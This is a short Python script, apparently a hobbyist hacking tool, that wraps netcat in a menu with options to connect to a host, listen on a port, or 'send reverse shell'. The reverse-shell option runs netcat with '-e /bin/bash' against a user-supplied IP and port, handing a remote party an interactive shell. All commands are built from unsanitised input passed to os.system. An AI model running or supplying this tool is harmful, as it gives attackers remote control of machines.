#!/usr/bin/python3
import os
print("--------------------------------------------------------")
print("__        _   _ _____ _____ ____    _  _____        __  ")
print("| _|_/\__ | \ | | ____|_   _/ ___|  / \|_   _| __/\_|_ |")
print("| |\    / |  \| |  _|   | || |     / _ \ | |   \    /| |")
print("| |/_  _\ | |\  | |___  | || |___ / ___ \| |   /_  _\| |")
print("| |  \/   |_| \_|_____| |_| \____/_/   \_\_|     \/  | |")
print("|__|                                                |__|")
print("--------------------------------------------------------------------")
print("                                                     [ ~NULLBYTE007]")
print("--------------------------------------------------------------------")
print("[*] 1: CLIENT --> CONNECT TO HOST")
print("[*] 2: SERVER --> LISTEN FOR CONNECTIONS")
print("[*] 3: SEND REVERSE SHELL")
choice = input("NETCAT : ")



def client():
    print("[*] CLIENT MODULE")
    ip_address = input("[*] ENTER THE DESTINATION IP ADDRESS : ")
    port = input("[*] ENTER THE DESTINATION PORT : ")
    print("[*] ESTABLISHING CONNECTION TO [ {} ] on PORT [ {} ]".format(ip_address,port))
    os.system("nc -nv {} {}".format(ip_address,port))
    

def server():
    print("[*] SERVER MODULE")
    port = input("[*] ENTER PORT TO LISTEN ON : ")
    os.system("nc -l -vv -p {}".format(port))


def reverse():
    print("[*] REVERSE SHELL MODULE")
    ip_address = input("[*] ENTER THE DESTINATION IP ADDRESS : ")
    port = input("[*] ENTER THE DESTINATION PORT : ")
    print("[*] SENDING SHELL TO [ {} ] on PORT [ {} ]".format(ip_address,port))
    os.system("nc -nv {} {} -e /bin/bash".format(ip_address,port))



if choice =='1':
    client()

elif choice =='2':
    server()
    
elif choice =='3':
    reverse()
